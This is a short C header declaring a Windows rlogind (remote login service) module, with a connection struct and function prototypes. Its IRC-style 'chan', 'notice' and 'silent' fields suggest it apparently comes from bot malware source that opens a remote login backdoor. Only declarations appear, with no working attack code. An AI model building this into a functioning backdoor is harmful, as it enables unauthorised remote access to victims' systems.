#ifndef NO_RLOGIND

#define PERMISSION_DENIED_MSG "Permission denied\n"

typedef struct RLOGIND 
{
	SOCKET sock;
	char chan[128];
	char username[64];
	char hostname[256];
	unsigned short port;
	int threadnum;
	int cthreadnum;
	bool insecure;
	bool notice;
	bool silent;
	bool gotinfo;

} RLOGIND;

static bool GetStr(SOCKET Socket, char *buffer, int cnt);
static bool CtrlHandler(DWORD CtrlType);
static bool CheckLogin(char *RemoteUser, char *RemoteHost, char *LocalUser, unsigned long ClientAddr);
DWORD WINAPI RlogindClientThread(LPVOID param);
DWORD WINAPI RlogindThread(LPVOID param);
#endif